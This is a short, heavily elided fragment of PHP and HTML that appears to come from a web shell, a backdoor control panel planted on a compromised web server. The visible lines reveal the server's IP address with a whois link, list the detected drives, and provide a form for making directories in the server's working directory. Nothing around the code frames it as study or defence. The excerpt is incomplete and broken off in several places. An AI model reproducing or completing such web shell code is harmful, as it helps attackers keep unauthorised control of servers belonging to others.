		...
		<tr>
			<td>
					<p align="left"><?php 
								...
								<br>ifconfig : <?php echo gethostbyname($_SERVER["HTTP_HOST"])?> <a href="http://whois.domaintools.com/<?php echo gethostbyname($_SERVER["HTTP_HOST"])?>">(Whois)</a>
								<br />Detected drives: <?php echo$drives?><br />
				...
				<table width="100%" style="font-size:14px;background:transparent;" border="0" cellpadding="20px">
					...
					<tr>
						...
						?>
							...
							Make Directory (<?php echo$cwd?>/) : <br /><input type="text" style="padding:5px;margin-top:10px;width:290px;"  name="mkdir" placeholder="Folder Name"/> <input type="submit" style="padding:5px;margin-top:10px;width:50px;" name="submit" value="Send"/>
						    </form>
						</td>
						<td>
						<?php
